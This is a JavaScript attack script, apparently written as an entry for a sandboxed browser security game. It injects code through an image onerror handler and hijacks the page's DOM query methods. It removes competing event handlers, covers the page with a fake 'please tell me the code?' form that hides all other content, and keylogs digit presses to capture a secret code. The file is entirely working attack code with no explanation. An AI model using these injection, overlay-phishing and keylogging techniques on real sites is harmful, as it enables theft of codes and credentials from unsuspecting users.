// API calls

function read(selector) {
  postMessage({'read': {'selector': selector}});
}

function capture(guess) {
  postMessage({'capture': {'secret': guess}});
}

function setAttr(selector, name, value) {
  postMessage({'setAttr': {'selector': selector, 'name': name, 'value': value}});
}

function append(selector, name) {
  postMessage({'append': {'selector': selector, 'name': name}});
}

function setAttrs(selector, attrs) {
  for (var name in attrs) {
    setAttr(selector, name, attrs[name]);
  }
}

// ID generation

function randRange(low, high) {
  return Math.floor(low + Math.random() * (high - low));
}

function makeId() {
  return 'x' + randRange(0, 100000000);
}

// Global variables

var waitingForInit = true;
var secret = makeId();
var overlayId = makeId();
var receiverId = makeId();

// JS execution

function executeJs(js) {
  var id = makeId();
  append('body', id);
  append(id, 'img');
  setAttr(id + ' img', 'onerror', js + '; this.parentNode.removeChild(this);');
  setAttr(id + ' img', 'style', 'display: none');
  setAttr(id + ' img', 'src', 'about:error');
}

// Initial race to grab the document methods

executeJs(`
if (!window.<<secret>>) {
  window.<<secret>> = {
    'dce': document.createElement,
    'dqs': document.querySelector,
    'dqsa': document.querySelectorAll
  };
  document.createElement = null;
  document.getElementById = null;
  document.getElementsByClassName = null;
  document.getElementsByName = null;
  document.getElementsByTagName = null;
  document.getElementsByTagNameNS = null;
  document.querySelector = null;
  document.querySelectorAll = null;
}
`.replace(/<<secret>>/g, secret));

// Remove all other event handlers on elements containing our overlay

function wipe() {
  executeJs(`

function clearHandlers(e) {
  var attrs = e.attributes;
  if (attrs && attrs.length) {
    var toRemove = [], i;
    for (i = 0; i < attrs.length; i++) {
      var n = attrs[i].name;
      if (n.substr(0, 2) == 'on') toRemove.push(n);
    }
    for (i = 0; i < toRemove.length; i++) {
      e.removeAttribute(toRemove[i]);
    }
  }
}

for (var n = window.<<secret>>.dqs.call(document, '<<overlayId>>').parentNode;
     n; n = n.parentNode) {
  clearHandlers(n);
}

`.replace(/<<overlayId>>/g, overlayId
).replace(/<<secret>>/g, secret
));

  setTimeout(wipe, 1);
}
wipe();

// Draw the form and keep it on top of everything else

function init() {
  executeJs(`

if (!window.<<secret>>.init) {
  function randRange(low, high) {
    return Math.floor(low + Math.random() * (high - low));
  }

  var h = window.<<secret>>.dqs.call(document, 'html');
  var hw = h.offsetWidth, hh = h.offsetHeight;
  var iw = randRange(300, 500), ih = randRange(200, 400);
  var ix = (hw - iw)/2, iy = (hh - ih)/2 - 20;

  h.innerHTML = \`
<body>
  <<<receiverId>> style="display: none" class="<<secret>>"></<<receiverId>>>
  <<<overlayId>> class="<<secret>>" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2147483647">
    <div class="<<secret>>" style="padding: 6px; border: 1px solid #888; border-radius: 4px; font-family: helvetica; font-size: 16px; line-height: 24px; text-align: center; position: absolute; left: \` + ix + \`; top: \` + iy + \`">
      <img class="<<secret>>" src="http://placekitten.com/\` + iw + \`/\` + ih + \`">
      <div class="<<secret>>">please tell me the code?</div>
      <input class="<<secret>>" id="<<secret>>_input" style="font-size: 16px" size=12>
      <input class="<<secret>>" style="font-size: 16px" type="submit" value="please?">
      <<<secret>>_init style="display: none"><<secret>>_init</<<secret>>_init>
    </div>
  </<<overlayId>>>
</body>\`;

  window.<<secret>>.dqs.call(document, '#<<secret>>_input').focus();

  // Stash the code in the receiver element

  var r = window.<<secret>>.dqs.call(document, '<<receiverId>>');
  h.addEventListener('keyup', function(e) {
    if (e.keyCode >= 48 && e.keyCode <= 57) {
      r.innerText += ('' + (e.keyCode - 48));
    }
    if (e.keyCode == 8) {
      r.innerText = r.innerText.replace(/.$/, '');
    }
  }, true);

  function raise() {
    var nodes = window.<<secret>>.dqsa.call(document, '*');
    for (var i = 0; i < nodes.length; i++) {
      var n = nodes[i];
      var name = n.nodeName.toLowerCase();
      if (name != 'html' && name != 'body' && name != 'script' &&
          n.className != '<<secret>>') {
        n.style.display = 'none';
        n.style.zIndex = -1000;
      }
    }
    h.style.display = 'absolute';
    h.style.zIndex = 2147483647;
    setTimeout(raise, 1);
  }
  raise();

  window.<<secret>>.init = true;
}

`.replace(/<<overlayId>>/g, overlayId
).replace(/<<receiverId>>/g, receiverId
).replace(/<<secret>>/g, secret
));
  if (waitingForInit) {
    read(secret + '_init');
    setTimeout(init, 1);
  }
}
init();

// Handle an incoming read result (this is how we get the captured code)

onmessage = function(e) {
  if (e.data.innerHTML) {
    var text = e.data.innerHTML.trim();
    if (text == secret + '_init') {
      waitingForInit = false;
    } else {
      for (var i = 0; i < text.length - 1; i++) {
        capture(text.substr(i));
      }
    }
  }
};

// Capture the code from the receiver element

function nextAttempt() {
  read(receiverId);
  setTimeout(nextAttempt, 10);
}
nextAttempt();
